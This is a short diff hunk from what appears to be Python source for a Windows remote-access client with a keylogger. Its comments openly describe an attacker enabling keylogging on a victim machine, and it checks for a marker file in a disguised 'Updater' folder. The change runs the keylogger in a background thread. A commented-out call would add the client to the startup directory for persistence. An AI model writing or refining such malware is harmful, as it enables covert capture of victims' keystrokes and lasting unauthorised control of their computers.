@@ -476,7 +476,7 @@ def run_commands():
 
 if os.path.isfile("C:\\Users\\" + getpass.getuser() + "\\Updater\\updateDDDMA.txt"):
     # Attacker has enabled keylogger on this machine before
-    start_keylogger()
+    threading.Thread(target=start_keylogger).start()
 
 # start_up()
 # If you uncomment the line above, the file will be added to the startup directory to that the client will start up everytime the computer turns on
